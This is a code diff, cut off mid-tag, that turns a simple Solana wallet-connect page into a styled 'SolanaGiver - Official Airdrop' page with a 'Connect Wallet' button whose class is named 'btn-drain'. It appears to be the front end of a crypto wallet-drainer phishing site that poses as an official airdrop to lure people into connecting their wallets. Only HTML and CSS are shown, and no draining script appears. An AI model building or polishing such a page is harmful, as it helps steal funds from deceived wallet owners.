@@ -3,17 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Wallet</title>
-    <!-- FIX: Notice the / before css -->
-    <link rel="stylesheet" href="/css/style.css">
+    <title>SolanaGiver - Official Airdrop</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #9945FF;
+            --primary-hover: #7b2cbf;
+            --bg: #0f0f13;
+            --card-bg: #1a1a20;
+            --text: #ffffff;
+            --text-muted: #a0a0a0;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Navbar */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            border-bottom: 1px solid #333;
+        }
+        .logo { font-weight: 700; font-size: 20px; letter-spacing: -0.5px; }
+        .nav-btn { 
+            background: transparent; 
+            border: 1px solid #333; 
+            color: var(--text); 
+            padding: 8px 16px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 14px;
+        }
+
+        /* Main Content */
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid #333;
+        }
+
+        h1 { margin: 0 0 10px 0; font-size: 28px; }
+        p { color: var(--text-muted); margin-bottom: 30px; line-height: 1.5; }
+
+        /* The Button */
+        .btn-drain {
+            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(153, 69, 255, 0.3);
+        }
+
+        .btn-drain:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(153, 69, 255, 0.5);
+        }
+
+        .btn-drain:active {
+            transform: translateY(0);
+        }
+
+        .btn-drain:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            height: 20px;
+        }
+        
+        .success { color: #00c853; }
+        .error { color: #ff3d00; }
+    </style>
 </head>
 <body>
-    <div id="wallet-container">
-        <h1>Connect Solana Wallet</h1>
-        <button id="connect-btn">Connect Phantom</button>
-    </div>
+    <nav>
+        <div class="logo">SolanaGiver</div>
+        <button id="nav-connect" class="nav-btn">Connect Wallet</button>
+    </nav>
 
-    <!-- FIX: Notice the / before js -->
-    <script src="/js/script.js"></script>
-</body>
-</html>
+    <div
